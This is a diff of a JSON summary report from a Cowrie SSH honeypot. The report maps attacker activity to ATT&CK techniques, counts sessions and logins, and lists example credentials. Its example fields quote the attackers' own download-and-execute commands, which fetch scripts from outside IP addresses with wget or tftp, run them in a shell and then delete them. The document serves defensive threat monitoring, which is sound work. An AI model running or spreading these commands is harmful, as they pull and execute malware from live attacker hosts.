@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-16 21:01:45",
+  "generated": "2026-08-16 22:03:53",
   "totals": {
-    "commands": 1735,
-    "login_failed": 6681,
-    "login_success": 213,
-    "sessions": 4764
+    "commands": 2385,
+    "login_failed": 7339,
+    "login_success": 416,
+    "sessions": 5261
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 6681,
+      "count": 7339,
       "examples": [
         "usr1cv8 / usr1cv8",
         "serv / serv",
@@ -21,14 +21,14 @@
         "admin / Aa123456"
       ],
       "first": "2026-08-16T00:00:42.329332Z",
-      "last": "2026-08-16T21:01:42.316387Z",
-      "unique_ips": 136
+      "last": "2026-08-16T22:03:49.643483Z",
+      "unique_ips": 140
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 409,
+      "count": 426,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,30 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T20:34:09.508484Z",
-      "unique_ips": 37
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 216,
-      "examples": [
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        "http://2.26.136.128/twget.sh",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
-      ],
-      "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T20:34:09.508484Z",
+      "last": "2026-08-16T21:54:57.118890Z",
       "unique_ips": 39
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 213,
+      "count": 416,
       "examples": [
         "admin / admin",
         "enable\\x00 / linuxshell\\x00",
@@ -69,22 +53,38 @@
         "installer / installer"
       ],
       "first": "2026-08-16T00:06:11.647402Z",
-      "last": "2026-08-16T21:00:58.407629Z",
-      "unique_ips": 111
+      "last": "2026-08-16T22:03:50.039728Z",
+      "unique_ips": 114
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 224,
+      "examples": [
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        "http://2.26.136.128/twget.sh",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
+      ],
+      "first": "2026-08-16T00:06:13.111253Z",
+      "last": "2026-08-16T21:54:57.118890Z",
+      "unique_ips": 41
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 23,
+      "count": 24,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-08-16T01:30:05.936984Z",
-      "last": "2026-08-16T20:33:33.494441Z",
-      "unique_ips": 23
+      "last": "2026-08-16T21:54:20.841186Z",
+      "unique_ips": 24
     },
     {
       "id": "T1082",
@@ -223,19 +223,19 @@
   "unmapped": [
     [
       "/bin/busybox",
-      423
+      430
     ],
     [
       "sh",
-      135
+      329
     ],
     [
       "shell",
-      102
+      296
     ],
     [
       "system",
-      83
+      277
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -243,11 +243,11 @@
     ],
     [
       "enable",
-      51
+      56
     ],
     [
       "linuxshell",
-      39
+      42
     ],
     [
       "shel",
@@ -255,19 +255,31 @@
     ],
     [
       "ping ;sh",
-      27
+      28
     ],
     [
       "cd /proc && cat self/cmdline",
-      26
+      27
     ],
     [
       "enablelinuxshell",
-      25
+      26
     ],
     [
       "busybox",
-      19
+      20
+    ],
+    [
+      "zalee",
+      18
+    ],
+    [
+      "za",
+      18
+    ],
+    [
+      "&k`g&k|zpkfq)ES[M",
+      18
     ],
     [
       "/bin/busybox BOTNET",
@@ -278,28 +290,16 @@
       10
     ],
     [
-      "zalee",
-      10
-    ],
-    [
-      "za",
-      10
-    ],
-    [
-      "&k`g&k|zpkfq)ES[M",
-      10
-    ],
-    [
       "ping; sh",
-      7
+      9
     ],
     [
       "/bin/busybox STC",
-      7
+      9
     ],
     [
       "/bin/busybox hostname TOASTER",
-      7
+      9
     ]
   ]
 }
